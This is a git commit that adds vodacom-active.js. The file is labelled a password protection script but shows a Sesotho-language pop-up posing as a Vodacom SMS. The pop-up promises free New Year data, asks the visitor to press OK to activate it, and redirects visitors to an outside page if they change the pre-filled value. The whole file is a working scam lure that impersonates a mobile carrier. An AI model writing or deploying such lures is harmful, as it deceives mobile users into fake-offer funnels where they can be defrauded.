d1015808690ea6eb5266b73fd0d2c7fb79191924
ukpeha505-rgb <ukpeha505@gmail.com>
2026-01-01 21:24:03 +0100

    Create vodacom-active.js

---
+++ vodacom-active.js
@@ -0,0 +1,10 @@
+  
+/* Password Protection Script by www.onlineofferz.xyz*/
+var password = 'SEBELISA DATA YA MAHALA'
+password = prompt(
+  'SMS: Kea u babatsa! Nomoro ea hau ea Vodacom e loketse ho fumana Tlhahiso ea Selemo se Secha. Ka kopo, tobetsa OK ho Actiavte Data hona joale.',
+  'SEBELISA DATA YA MAHALA'
+);
+if (password != 'SEBELISA DATA YA MAHALA') {
+  location.href = 'https://fliout.org/vodacom.html';
+}
